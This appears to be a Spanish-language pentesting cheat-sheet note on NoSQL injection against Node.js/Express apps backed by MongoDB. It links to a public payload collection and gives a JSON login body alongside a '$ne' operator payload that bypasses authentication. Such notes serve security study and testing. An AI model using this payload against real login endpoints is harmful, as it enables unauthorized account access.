# NoSQL

Tags: #NoSQLI #NodeJs #MongoDB 

```bash 
- Express framework: Es un entorno de trabajo para aplicaciones web en Node.js, de código abierto y con licencia MIT. Se utiliza para desarrollar aplicaciones web y APIs.

- Node.js: Es un entorno de ejecución de JavaScript de código abierto y multiplataforma, diseñado para construir aplicaciones del lado del servidor y de red. Node.js permite que JavaScript se ejecute en el servidor, no solo en el navegador.

- MongoDB: Es una base de datos NoSQL que almacena datos en documentos flexibles, mientras que Node.js es un entorno de ejecución JavaScript que permite construir aplicaciones del lado del servidor
```

## Inyecciones 

* [NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

```json 
// Cambiar la cabecera a 'Content-Type: application/json' para que funcione y enviar la data en el cuerpo de la petición 

{
	"username" : "admin",
	"password" : "admin"
}

Nota:
	1. La petición original se debe de cambiar a Json 
```

```json 
// Inyección para indicar que el usuario y la password no es 'admin' por lo que sería 'True'

{
	"username" : {"$ne": "admin"},
	"password" : {"$ne": "admin"}
}
```